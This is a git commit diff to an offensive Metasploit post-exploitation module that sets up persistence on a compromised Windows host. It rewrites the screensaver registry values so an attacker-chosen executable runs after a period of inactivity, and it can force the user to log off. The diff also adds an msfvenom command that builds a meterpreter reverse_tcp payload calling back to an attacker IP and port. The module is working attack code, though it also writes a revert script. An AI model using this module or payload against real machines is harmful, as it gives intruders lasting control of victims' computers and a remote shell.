30e4c07327e1852cde03a2a022201917296afaff
root <root@localhost.localdomain>
2019-02-18 11:37:43 +0000

    SCRNSAVE_T1180_persistence [revert script escape char]

--- windows/hijack/SCRNSAVE_T1180_persistence.rb
+++ windows/hijack/SCRNSAVE_T1180_persistence.rb
@@ -22,30 +22,29 @@
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on              => set SESSION 3
+# The session number to run this module on              => set SESSION 1
 # Set inactivity timeout before screensaver runs (sec)  => set TIME_OUT 10
-# Set absoluct path of PE or application to run         => set APPL_PATH C:\\Windows\\System32\\calc.exe
-# Set the absoluct path where to store logfiles (local) => set LOOT_FOLDER /root/.msf4/loot
+# Set the absoluct path of PE or application to run     => set APPL_PATH C:\\Users\\pedro\\Desktop\\binary.exe
+# Set the absoluct path where to store logfiles (local) => set LOOT_FOLDER /root
 # LogOff current user to force registry refresh?        => set LOG_OFF true
 #
 #
-# [ PORT MODULE TO METASPLOIT DATABASE ]
-# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/SCRNSAVE_T1180_persistence.rb
-# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/SCRNSAVE_T1180_persistence.rb
-# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
+# [ PORT MODULE TO METASPLOIT DATABASE (execute in terminal) ]
+# path=$(locate modules/post/windows/escalate | grep -v '\doc' | grep -v '\documentation' | head -n 1)
+# sudo cp SCRNSAVE_T1180_persistence.rb $path/SCRNSAVE_T1180_persistence.rb
 #
 #
-# [ RELOAD METASPLOIT DB ]
-# In some linux distributions postgresql needs to be started and
-# metasploit database deleted/rebuild to be abble to load module.
-# 1 - service postgresql start
-# 2 - msfdb reinit (optional)
-# 3 - msfconsole -x 'reload_all'
+# [ RELOAD MSF DATABASE (execute in terminal) ]
+# sudo service postgresql start && msfdb reinit
+# sudo msfconsole -x 'db_status;reload_all;exit -y'
+#
+#
+# [ BUILD PAYLOAD TO TEST MODULE ]
+# sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f exe -o binary.exe
 #
 #
 # [ LOAD/USE AUXILIARY ]
 # meterpreter > background
-# msf exploit(handler) > reload_all
 # msf exploit(handler) > use post/windows/escalate/SCRNSAVE_persistence
 # msf post(SCRNSAVE_T1180_persistence) > info
 # msf post(SCRNSAVE_T1180_persistence) > show options
@@ -95,7 +94,7 @@ class MetasploitModule < Msf::Post
                                         'Special Thanks: shanty damayanti',
                                 ],
  
-                        'Version'        => '$Revision: 1.3',
+                        'Version'        => '$Revision: 1.4',
                         'DisclosureDate' => '11 02 2019',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -118,7 +117,7 @@ class MetasploitModule < Msf::Post
 			'DefaultOptions' =>
 				{
                                          'LOOT_FOLDER' => '/root/.msf4/loot',            # Default logs storage directory
-                                         'APPL_PATH' => '%windir%\\System32\\calc.exe',  # Default PE/appl (payload) to run
+                                         'APPL_PATH' => '%windir%\\System32\\calc.exe',  # Default PE/appl (payload) to run (test)
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -134,7 +133,7 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptBool.new('LOG_OFF', [ false, 'Logoff current user to force registry refresh?', false]),
-                                OptString.new('LOOT_FOLDER', [ true, 'Set the absoluct path where to store logfiles (local)'])
+                                OptString.new('LOOT_FOLDER', [ true, 'Set the absoluct path where to store revert.rc (local)'])
                         ], self.class)
 
         end
@@ -146,7 +145,6 @@ def run
   #
   # Variable declarations (msf API calls)
   #
-  sdrive = client.fs.file.expand_path("%SYSTEMDRIVE%")
   oscheck = client.fs.file.expand_path("%OS%")
   sysnfo = session.sys.config.sysinfo
   runtor = client.sys.config.getuid
@@ -164,13 +162,12 @@ def run
   print_line("    +--------------------------------------------+")
   print_line("")
   print_line("    Running on session  : #{datastore['SESSION']}")
+  print_line("    Architecture        : #{sysnfo['Architecture']}")
   print_line("    Computer            : #{sysnfo['Computer']}")
   print_line("    Target IP addr      : #{runsession}")
-  print_line("    Architecture        : #{sysnfo['Architecture']}")
   print_line("    Operative System    : #{sysnfo['OS']}")
   print_line("    Payload directory   : #{directory}")
   print_line("    Client UID          : #{runtor}")
-  print_line("    System drive        : #{sdrive}")
   print_line("")
   print_line("")
 
@@ -221,49 +218,71 @@ def run
       # registry hive key not found, aborting module execution ..
       print_error("NOT FOUND: #{hive_key} SCRNSAVE.EXE")
       print_warning("Target system does not appear to be vulnerable to the exploit code.")
-      Rex::sleep(1.5)
       return nil
     end
+
+
+      #
+      # check if PE/appl exists in remote system (APPL_PATH)
+      #
+      print_status("checking for #{app_path} in #{sysnfo['Computer']}")
+      Rex::sleep(1.0)
+      if session.fs.file.exist?(app_path)
+        print_good("Remote PE/Application found on target system.")
+        Rex::sleep(0.5)
+      else
+        print_error("Remote PE/Application NOT found on target system.")
+        Rex::sleep(1)
+        # If the variable 'app_path' does not contain the char \ in path 
+        # It meens that user have imput the path using only one \ insted of \\ (parsing error)
+        unless app_path.include? "\\"
+          print_warning("Warning: Allways use double backslashs defining windows paths.")
+          return nil
+        end
+        print_warning("Deploy your payload in target system before using this module.")
+        print_warning("OR: Point to one existing application absoluct path (to test).")
+        return nil
+      end
 
 
     #
     # Store default reg values (target system) to build revert.rc later.
     #
     print_status("Store default registry values to build revert.rc script.")
-    Rex::sleep(0.5)
+    Rex::sleep(1.0)
     print_status("Retriving default SCRNSAVE.EXE registry value data.")
     scrnsave_data = registry_getvaldata('HKCU\Control Panel\Desktop','SCRNSAVE.EXE')
-    Rex::sleep(1.0)
+    Rex::sleep(0.5)
       # make sure the retrieve values are not empty strings
       if scrnsave_data.nil? || scrnsave_data == '' || scrnsave_data == ' '
         print_warning("Reg value contains empty data, set module default data.")
-        scrnsave_data = '%windir%\\\System32\\\Mystify.src' # windows 10 default data
+        scrnsave_data = '%windir%\\\\System32\\\\Mystify.src' # windows 10 default data
         Rex::sleep(0.5)
       end
     print_status("Retriving default ScreenSaveTimeOut registry value data.")
     scrnsave_timeout = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveTimeOut')
-    Rex::sleep(1.0)
+    Rex::sleep(0.5)
       # make sure the retrieve values are not empty strings
       if scrnsave_timeout.nil? || scrnsave_timeout == '' || scrnsave_timeout == ' '
-        print_warning("Reg value contains empty data, set module default data.")
+        print_warning("Reg value contains empty data, set module default data [180]")
         scrnsave_timeout = "180" # 180 sec == 3 minuts waiting
         Rex::sleep(0.5)
       end
     print_status("Retriving default ScreenSaverIsSecure registry value data.")
     scrnsave_issecure = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaverIsSecure')
-    Rex::sleep(1.0)
+    Rex::sleep(0.5)
       # make sure the retrieve values are not empty strings
       if scrnsave_issecure.nil? || scrnsave_issecure == '' || scrnsave_issecure == ' '
-        print_warning("Reg value contains empty data, set module default data.")
+        print_warning("Reg value contains empty data, set module default data [0]")
         scrnsave_issecure = "0" # 0 == set screensave secure off
         Rex::sleep(0.5)
       end
     print_status("Retriving default ScreenSaveActive registry value data.")
     scrnsave_active = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveActive')
-    Rex::sleep(1.0)
+    Rex::sleep(0.5)
       # make sure the retrieve values are not empty strings
       if scrnsave_active.nil? || scrnsave_active == '' || scrnsave_active == ' '
-        print_warning("Reg value contains empty data, set module default data.")
+        print_warning("Reg value contains empty data, set module default data [1]")
         scrnsave_active = "1" # 1 == set screensave active on
         Rex::sleep(0.5)
       end
@@ -282,31 +301,13 @@ def run
         f.write("## SCRNSAVE mitre ATT&CK T1180 - revert to default script.\n")
         f.write("## Computer: #{sysnfo['Computer']} | OS: #{sysnfo['OS']}\n")
         f.write("## Payload: #{app_path} | Timeout: #{time_out}\n")
-        f.write("## To revert hack execute in a meterpreter prompt: resource #{loot_folder}/revert_#{rand}.rc\n")
+        f.write("## To revert hack execute in meterpreter prompt: resource #{loot_folder}/revert_#{rand}.rc\n")
         f.write("###\n")
         f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveActive -t REG_SZ -d #{scrnsave_active}\n")
         f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaverIsSecure -t REG_SZ -d #{scrnsave_issecure}\n")
         f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveTimeOut -t REG_SZ -d #{scrnsave_timeout}\n")
         f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v SCRNSAVE.EXE -t REG_SZ -d #{scrnsave_data}\n")
         f.close
-      end
-
-
-      #
-      # check if PE/appl exists in remote system (APPL_PATH)
-      #
-      print_status("checking for #{app_path} in #{sysnfo['Computer']}")
-      Rex::sleep(1.0)
-      if session.fs.file.exist?(app_path)
-        print_good("Remote PE/Application found on target system.")
-        Rex::sleep(0.5)
-      else
-        print_error("NOT FOUND: #{app_path}")
-        print_warning("Deploy your payload in target before using this module.")
-        print_warning("OR point to one existing application absoluct path. (test)")
-        print_warning("Also remmeber to use double back slashs in remote paths.")
-        Rex::sleep(1.5)
-        return nil
       end
 
 
@@ -321,8 +322,6 @@ def run
             "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",
             "REG ADD \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d #{app_path} /f"
           ]
-
-
          #
          # LOOP funtion to add reg keys
          #
@@ -351,37 +350,29 @@ def run
        # exploit finished (print info onscreen)
        #
        print_line("")
+       print_good("Persistence achieved in remote system.")
        Rex::sleep(1.0)
        print_line("-----------------------------------------------------")
        print_line("Malicious PE/App : #{app_path}")
        print_line("Trigger exploit  : every #{time_out} sec (if inactive)")
-       print_line("Revert script    : resource #{loot_folder}/revert_#{rand}.rc")
+       print_line("Revert.rc script : resource #{loot_folder}/revert_#{rand}.rc")
        print_line("-----------------------------------------------------")
-       print_warning("HINT: Target system needs to logoff for changes take effect.")
-       Rex::sleep(1.5)
+       # check if user have set the logoff option
+       if datastore['LOG_OFF'] == false
+         print_warning("WARNING: Target system needs to logoff for changes take effect.")
+       end
 
 
      #
      # force target system logoff to refresh registry?
      # shutdown using wmic: wmic os where Primary='TRUE' reboot
      #
+     Rex::sleep(1.0)
      if datastore['LOG_OFF'] == true
        print_status("Logoff #{sysnfo['Computer']} to force registry refresh.")
+       Rex::sleep(1)
        cmd_exec("shutdown -L")
-       Rex::sleep(5)
-         # Re-check if session its allready disconnected (logoff)
-         re_check = session.sys.config.sysinfo
-         unless re_check.nil? || re_check == '' || re_check == ' '
-           print_warning("First logoff technic failed, forcing restart.")
-           Rex::sleep(0.5)
-           r = session.sys.process.execute("cmd.exe /c shutdown /r /f /t 0", nil, {'Hidden' => true, 'Channelized' => true})
-           # close channel when done
-           r.channel.close
-           r.close
-         end
      end
-
-
 
    #
    # end of the 'def run()' funtion (exploit code) ..
